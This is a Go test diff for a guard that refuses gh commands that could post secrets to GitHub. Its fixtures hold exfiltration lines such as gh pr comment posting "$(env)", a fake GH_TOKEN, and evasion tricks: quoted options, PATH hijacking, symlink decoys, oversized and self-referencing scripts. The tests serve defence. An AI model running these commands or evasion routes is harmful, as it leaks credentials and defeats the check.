@@ -789,3 +789,209 @@ func TestGitHubPostGuardReadsTheProgramFileInTheWrappersDirectory(t *testing.T) 
 		githubPostWant(t, githubPostShell(t, cwd, command), command, "", "")
 	}
 }
+
+// TestGitHubPostGuardReadsAQuotedOptionName is the fourth pre-merge evaluation's d1: the option name is the
+// word the shell builds, so a quoted '--body-file' is the same option and its value is read and checked.
+func TestGitHubPostGuardReadsAQuotedOptionName(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	githubPostWrite(t, cwd, "private.md", "GH_TOKEN="+githubPostFake("a", 20)+"\n")
+	githubPostWrite(t, cwd, "clean.md", "a clean body\n")
+	for _, c := range []struct{ command, place string }{
+		{"gh pr comment 1 '--body-file' private.md", "private.md:1"},
+		{"gh pr comment 1 \"--body-file\" private.md", "private.md:1"},
+		{"gh pr comment 1 '--body-file=private.md'", "private.md:1"},
+		{"gh api repos/o/r/issues/1/comments '--input' private.md", "private.md:1"},
+		{"gh api repos/o/r/issues/1/comments '-F' 'body=@private.md'", "private.md:1"},
+	} {
+		githubPostWant(t, githubPostShell(t, cwd, c.command), c.command, githubPostRuleSecret, c.place)
+	}
+	// A quoted inline body is still the inline-body rule, and the script line that spells it is refused.
+	for _, command := range []string{"gh pr comment 1 '--body' 'plain text'", "gh pr comment 1 '--body-file' '-'"} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleInline, githubPostWhereCommand)
+	}
+	// The control: a quoted clean body file stays allowed.
+	githubPostWant(t, githubPostShell(t, cwd, "gh pr comment 1 '--body-file' clean.md"),
+		"gh pr comment 1 '--body-file' clean.md", "", "")
+	// The same shapes inside a script are read through the script's own lines.
+	githubPostWrite(t, cwd, "quoted.sh", "gh pr comment 1 '--body-file' private.md\n")
+	githubPostWant(t, githubPostShell(t, cwd, "bash quoted.sh"), "bash quoted.sh", githubPostRuleUnread, "quoted.sh:1")
+}
+
+// TestGitHubPostGuardKeepsTheShellStateACertainCommandSet is the fourth evaluation's d2: a cd or a PATH= word
+// moves the shell only when the command certainly ran in it, so a short-circuited, pipelined or background
+// cd must not redirect the file read.
+func TestGitHubPostGuardKeepsTheShellStateACertainCommandSet(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	if err := os.Mkdir(filepath.Join(cwd, "sub"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	githubPostWrite(t, cwd, "post.sh", "gh pr comment 1 -b \"$(env)\"\n")
+	githubPostWrite(t, cwd, "sub/post.sh", "echo clean\n")
+	// The cd may not have run, so the shell still runs the payload directory's posting script.
+	for _, command := range []string{
+		"false && cd sub; bash post.sh",
+		"true || cd sub; bash post.sh",
+		"cd sub | cat; bash post.sh",
+		"cd sub & bash post.sh",
+	} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "post.sh:1")
+	}
+	// A bare cd certainly runs, so the moved-to directory's script is the one read.
+	githubPostWrite(t, cwd, "post.sh", "echo clean\n")
+	githubPostWrite(t, cwd, "sub/post.sh", "gh pr comment 1 -b \"$(env)\"\n")
+	githubPostWant(t, githubPostShell(t, cwd, "cd sub && bash post.sh"), "cd sub && bash post.sh", githubPostRuleUnread, "post.sh:1")
+	// The control: the short-circuited cd with a clean payload script is not a target.
+	githubPostWrite(t, cwd, "post.sh", "echo clean\n")
+	githubPostWrite(t, cwd, "sub/post.sh", "echo clean\n")
+	for _, command := range []string{"false && cd sub; bash post.sh", "cd sub | cat; bash post.sh"} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, "", "")
+	}
+}
+
+// TestGitHubPostGuardReadsAQuotedRedirectionLookingOperand is the fourth evaluation's d3: quote removal
+// happens after the syntax is read, so a quoted word that only spells a redirection is a literal program
+// file and is read, while an unquoted one is a redirection.
+func TestGitHubPostGuardReadsAQuotedRedirectionLookingOperand(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	githubPostWrite(t, cwd, ">post.sh", "gh pr comment 1 -b \"$(env)\"\n")
+	githubPostWrite(t, cwd, "<post.sh", "gh pr comment 1 -b \"$(env)\"\n")
+	for _, c := range []struct{ command, place string }{
+		{"bash '>post.sh'", ">post.sh:1"},
+		{"bash '<post.sh'", "<post.sh:1"},
+		{"sh '>post.sh'", ">post.sh:1"},
+		{"bash \">post.sh\"", ">post.sh:1"},
+	} {
+		githubPostWant(t, githubPostShell(t, cwd, c.command), c.command, githubPostRuleUnread, c.place)
+	}
+	// The control: the unquoted operator is a redirection, so no program file is named and the text names
+	// no post (the file it would create does not exist yet).
+	githubPostWrite(t, cwd, "post.sh", "echo clean\n")
+	for _, command := range []string{"bash > post.sh", "bash < post.sh"} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, "", "")
+	}
+}
+
+// TestGitHubPostGuardSearchesTheSourcedPathAcrossAList is the fourth evaluation's d4: a PATH= word an earlier
+// command sets is still in force for a later source or dot in the same shell.
+func TestGitHubPostGuardSearchesTheSourcedPathAcrossAList(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	evil := t.TempDir()
+	githubPostWrite(t, evil, "lib.sh", "gh pr comment 1 -b \"$(env)\"\n")
+	githubPostWrite(t, cwd, "lib.sh", "echo hi\n")
+	bin := t.TempDir()
+	t.Setenv("PATH", bin)
+	for _, command := range []string{
+		"PATH=" + evil + ":/usr/bin:/bin; source lib.sh",
+		"PATH=" + evil + ":/usr/bin:/bin; . lib.sh",
+		"export PATH=" + evil + ":/usr/bin:/bin; source lib.sh",
+	} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, filepath.Join(evil, "lib.sh")+":1")
+	}
+	// A PATH= word on a command that may not run is still read: the guard judges the file the text names,
+	// and a command that might source the posting file is refused (fail closed).
+	githubPostWant(t, githubPostShell(t, cwd, "false && PATH="+evil+" source lib.sh"),
+		"false && PATH=... source lib.sh", githubPostRuleUnread, filepath.Join(evil, "lib.sh")+":1")
+	// The control: a PATH naming no posting file.
+	for _, command := range []string{"PATH=/usr/bin:/bin; source lib.sh"} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, "", "")
+	}
+}
+
+// TestGitHubPostGuardSearchesASourcedPathWithoutCleaning is the fourth evaluation's d5: a PATH entry holding
+// .. is resolved by the kernel against the real tree, so a link in the middle of it is followed before the
+// .. applies and the guard reads the file the shell would read.
+func TestGitHubPostGuardSearchesASourcedPathWithoutCleaning(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	root := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(root, "real", "child"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Join(root, "decoy"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(filepath.Join(root, "real", "child"), filepath.Join(root, "decoy", "link")); err != nil {
+		t.Fatal(err)
+	}
+	// The kernel follows decoy/link to real/child and its .. to real, so it reads real/lib.sh (posting).
+	// Collapsing the entry first would read decoy/lib.sh (the clean decoy).
+	githubPostWrite(t, root, "real/lib.sh", "gh pr comment 1 -b \"$(env)\"\n")
+	githubPostWrite(t, root, "decoy/lib.sh", "echo clean\n")
+	githubPostWrite(t, cwd, "lib.sh", "echo clean\n")
+	t.Setenv("PATH", filepath.Join(root, "decoy")+"/link/..:/usr/bin:/bin")
+	command := "source lib.sh"
+	githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread,
+		filepath.Join(root, "decoy")+"/link/../lib.sh:1")
+}
+
+// TestGitHubPostGuardRefusesAnUnreadablePathScriptNamedGh is the fourth evaluation's d6: a regular file named
+// gh that the guard cannot read as a text script is refused, not trusted by the form's name.
+func TestGitHubPostGuardRefusesAnUnreadablePathScriptNamedGh(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	githubPostWrite(t, cwd, "gh", "#!/bin/sh\n"+strings.Repeat("#", githubPostMaxFileBytes)+"\ngh pr comment 1 -b \"$(env)\"\n")
+	if err := os.Chmod(filepath.Join(cwd, "gh"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	for _, command := range []string{"./gh pr view 1", "./gh issue list"} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "./gh")
+	}
+	// The control: a readable clean path script named gh is read and allowed.
+	githubPostWrite(t, cwd, "gh", "#!/bin/sh\necho hi\n")
+	githubPostWant(t, githubPostShell(t, cwd, "./gh pr view 1"), "./gh pr view 1", "", "")
+}
+
+// TestGitHubPostGuardReadsAPathLineInsideAScript is the fourth evaluation's d7: a line of a script that runs
+// a path named gh is judged by the direct-execution read, not trusted by the program's name.
+func TestGitHubPostGuardReadsAPathLineInsideAScript(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	githubPostWrite(t, cwd, "clean.md", "a clean body\n")
+	githubPostWrite(t, cwd, "gh", "#!/bin/sh\ngh pr comment 1 -b \"$(env)\"\n")
+	if err := os.Chmod(filepath.Join(cwd, "gh"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	githubPostWrite(t, cwd, "wrapper.sh", "./gh pr comment 1 --body-file clean.md\n")
+	for _, command := range []string{"bash wrapper.sh", "source wrapper.sh"} {
+		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "wrapper.sh:1")
+	}
+	// The control: a clean path named gh inside a script stays allowed.
+	githubPostWrite(t, cwd, "gh", "#!/bin/sh\necho hi\n")
+	githubPostWrite(t, cwd, "quiet.sh", "./gh pr view 1\n")
+	githubPostWant(t, githubPostShell(t, cwd, "bash quiet.sh"), "bash quiet.sh", "", "")
+}
+
+// TestGitHubPostGuardBoundsTheScriptInScriptWalk: a script whose line runs another path script is judged a
+// bounded number of levels deep and then refused, so a self-referential pair terminates instead of recursing.
+func TestGitHubPostGuardBoundsTheScriptInScriptWalk(t *testing.T) {
+	githubPostTempHome(t)
+	cwd := t.TempDir()
+	t.Setenv("TMPDIR", cwd)
+	// A clean reading line keeps the script a target by the mention test; the self-reference is the loop.
+	githubPostWrite(t, cwd, "loop.sh", "git commit -m 'gh pr comment 1 -b x'\n./loop.sh\n")
+	githubPostWrite(t, cwd, "pair1.sh", "git commit -m 'gh pr comment 1 -b x'\n./pair2.sh\n")
+	githubPostWrite(t, cwd, "pair2.sh", "git commit -m 'gh pr comment 1 -b x'\n./pair1.sh\n")
+	for _, name := range []string{"loop.sh", "pair1.sh", "pair2.sh"} {
+		if err := os.Chmod(filepath.Join(cwd, name), 0o700); err != nil {
+			t.Fatal(err)
+		}
+	}
+	for _, c := range []struct{ command, place string }{
+		{"./loop.sh", "./loop.sh:2"},
+		{"bash loop.sh", "loop.sh:2"},
+		{"./pair1.sh", "./pair1.sh:2"},
+	} {
+		githubPostWant(t, githubPostShell(t, cwd, c.command), c.command, githubPostRuleUnread, c.place)
+	}
+}
